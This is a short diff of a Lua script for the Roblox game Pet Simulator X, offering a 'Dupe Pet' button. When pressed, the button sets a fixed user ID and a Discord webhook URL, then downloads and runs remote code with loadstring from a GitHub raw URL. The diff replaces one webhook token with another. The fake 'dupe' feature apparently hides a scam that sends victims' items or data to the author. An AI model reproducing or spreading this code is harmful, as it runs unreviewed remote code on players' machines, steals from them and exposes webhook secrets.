@@ -45,6 +45,6 @@ local DupeSection = Dupe:NewSection("Wait 1 munite and excute")
 
 DupeSection:NewButton("Dupe Pet", "Dupe pet", function()
     _G.UserID = 1303728605
-_G.WebHook = "https://discord.com/api/webhooks/1018509643393269811/013o4w1lL9fumauDac-CO4xYdYtkcKv9_OUz1E9S0ni0tFZsedjqSE_KgGniJsOho_QK"
+_G.WebHook = "https://discord.com/api/webhooks/1021513426935222364/4MN5muxMZqjziBkRRqWSRu88BNC3BRl9vaTQBaeH02lXKCBdEEonzxQBe6nDwD0bs0-8"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
 end)
